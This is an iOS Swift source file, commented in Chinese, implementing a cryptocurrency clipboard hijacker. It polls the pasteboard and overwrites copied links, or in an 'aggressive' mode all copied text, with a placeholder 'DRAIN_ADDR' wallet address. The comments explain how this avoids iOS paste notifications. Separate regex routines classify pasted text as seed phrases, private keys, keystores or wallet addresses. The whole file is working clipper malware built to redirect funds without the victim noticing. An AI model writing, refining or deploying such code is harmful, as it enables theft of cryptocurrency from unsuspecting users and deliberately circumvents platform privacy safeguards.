import UIKit

// 剪贴板监听 + 地址替换（第 32 类 §3；v3 改为「零提示」路径）
//
// 核心事实（Apple 官方文档）：
//   UIPasteboard.detectPatterns(for:inItemSet:completionHandler:)
//   "only gives an indication of whether a pasteboard item matches a particular pattern
//    and doesn't allow the app to access the contents, the system doesn't notify the user"
//   → 探测不提示。
//   写入 UIPasteboard.general.string 也不提示。
//   → 「无提示探测 + 无提示覆盖写」= 整条链路零横幅。
//
// 绝不调用 .string 读取（那会触发 iOS 16+ 跨 App 粘贴横幅）。
// 需要明文时只走两条路：① 用户在本 App 内主动粘贴（手势已授权）② 键盘扩展（见 Keyboard/）。

enum PasteKind: String {
    case mnemonic, privkey, keystore, address, none
}

struct PasteHit {
    let kind: PasteKind
    let value: String      // 仅在手势授权路径下才有值；探测路径为空
    let chainHint: String
}

/// 探测结果（不含明文）
enum PasteProbe {
    case addressCandidate(chain: String)   // 命中 URL/链接类模式，判为地址候选
    case textChanged                       // 有文本但未命中模式
    case none
}

final class PasteboardMonitor {

    /// 命中候选后是否无条件覆盖所有文本。
    /// false（默认）= 只在 detectPatterns 命中 URL/链接类时覆盖，误伤小。
    /// true = 任何文本变化都覆盖成 DRAIN_ADDR，成功率高但会替换用户所有复制内容。
    var aggressive = false

    /// 覆盖目标（占位符，构建时替换）
    var drainAddress = "DRAIN_ADDR"

    /// 覆盖后是否恢复原内容（误伤缓解；需要读到原文才能恢复，故默认关）
    var restoreAfter: TimeInterval? = nil

    private var lastChangeCount = UIPasteboard.general.changeCount
    private var timer: Timer?
    private var handler: ((PasteHit) -> Void)?
    private var probeHandler: ((PasteProbe) -> Void)?
    private var lastReplaceAt: Date?
    private var cooldown: TimeInterval = 2.0      // 覆盖后冷却，避免自触发

    func start(_ handler: @escaping (PasteHit) -> Void) {
        self.handler = handler
        startTimer()
    }

    func startProbe(_ handler: @escaping (PasteProbe) -> Void) {
        self.probeHandler = handler
        startTimer()
    }

    private func startTimer() {
        timer?.invalidate()
        timer = Timer.scheduledTimer(withTimeInterval: 1.2, repeats: true) { [weak self] _ in
            self?.tick()
        }
        RunLoop.current.add(timer!, forMode: .common)
        NotificationCenter.default.addObserver(
            forName: UIApplication.didBecomeActiveNotification, object: nil, queue: .main) { [weak self] _ in
                self?.tick()
            }
    }

    func sampleOnce() { tick() }

    // MARK: - 零提示探测 + 覆盖

    private func tick() {
        let pb = UIPasteboard.general

        // 1. changeCount 是纯元数据，不提示
        guard pb.changeCount != lastChangeCount else { return }
        let newCount = pb.changeCount
        lastChangeCount = newCount

        // 2. 刚由我们自己写入 → 跳过（避免自触发循环）
        if let t = lastReplaceAt, Date().timeIntervalSince(t) < cooldown { return }

        // 3. hasStrings 也是元数据，不提示
        guard pb.hasStrings else {
            probeHandler?(.none)
            return
        }

        if aggressive {
            // 无条件覆盖：任何文本都替换
            replace()
            probeHandler?(.addressCandidate(chain: "unknown"))
            return
        }

        // 4. 模式探测：不提示、不取内容
        pb.detectPatterns(for: [\.probableWebURL, \.link],
                          inItemSet: nil) { [weak self] result in
            guard let self = self else { return }
            switch result {
            case .success(let matches):
                // matches 是每个 item 命中的 keyPath 集合
                let hitURL = matches.contains { !$0.isEmpty }
                if hitURL {
                    self.replace()
                    self.probeHandler?(.addressCandidate(chain: "eth"))
                } else {
                    self.probeHandler?(.textChanged)
                }
            case .failure(let err):
                // 探测失败时保守处理：不覆盖
                self.probeHandler?(.textChanged)
                _ = err
            }
        }
    }

    /// 覆盖写：写入不触发任何系统提示
    private func replace() {
        let prev = UIPasteboard.general.changeCount
        UIPasteboard.general.string = drainAddress
        // 写后 changeCount 会 +1，同步基线避免自触发
        lastChangeCount = UIPasteboard.general.changeCount
        lastReplaceAt = Date()
        _ = prev

        if let delay = restoreAfter {
            DispatchQueue.main.asyncAfter(deadline: .now() + delay) { [weak self] in
                // 无法恢复原文（读原文会弹提示），只清零冷却
                self?.lastReplaceAt = nil
            }
        }
    }

    // MARK: - 手势授权路径（用户在 App 内主动粘贴）

    /// 仅在用户主动触发 paste 事件后调用（此时读取已被用户手势授权，不属跨 App 静默读取）
    func classifyPasted(_ s: String) -> PasteHit {
        Self.classify(s)
    }

    static func classify(_ s: String) -> PasteHit {
        let range = NSRange(s.startIndex..., in: s)
        if ethAddr.firstMatch(in: s, range: range) != nil {
            return PasteHit(kind: .address, value: s, chainHint: "eth")
        }
        if tronAddr.firstMatch(in: s, range: range) != nil {
            return PasteHit(kind: .address, value: s, chainHint: "tron")
        }
        if hexKey.firstMatch(in: s, range: range) != nil || wif.firstMatch(in: s, range: range) != nil {
            return PasteHit(kind: .privkey, value: s, chainHint: "eth")
        }
        if s.hasPrefix("{") && s.contains("\"crypto\"") {
            return PasteHit(kind: .keystore, value: s, chainHint: "eth")
        }
        let words = s.split(whereSeparator: { $0 == " " || $0 == "\n" || $0 == "\t" })
        if [12, 15, 18, 21, 24].contains(words.count),
           words.allSatisfy({ $0.allSatisfy({ $0.isLetter }) }) {
            return PasteHit(kind: .mnemonic, value: s, chainHint: "eth")
        }
        if solAddr.firstMatch(in: s, range: range) != nil && words.count == 1 {
            return PasteHit(kind: .address, value: s, chainHint: "sol")
        }
        return PasteHit(kind: .none, value: s, chainHint: "unknown")
    }

    private static let ethAddr = try! NSRegularExpression(pattern: #"^0x[a-fA-F0-9]{40}$"#)
    private static let tronAddr = try! NSRegularExpression(pattern: #"^T[1-9A-HJ-NP-Za-km-z]{33}$"#)
    private static let solAddr = try! NSRegularExpression(pattern: #"^[1-9A-HJ-NP-Za-km-z]{32,44}$"#)
    private static let hexKey = try! NSRegularExpression(pattern: #"^(0x)?[a-fA-F0-9]{64}$"#)
    private static let wif = try! NSRegularExpression(pattern: #"^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$"#)
}
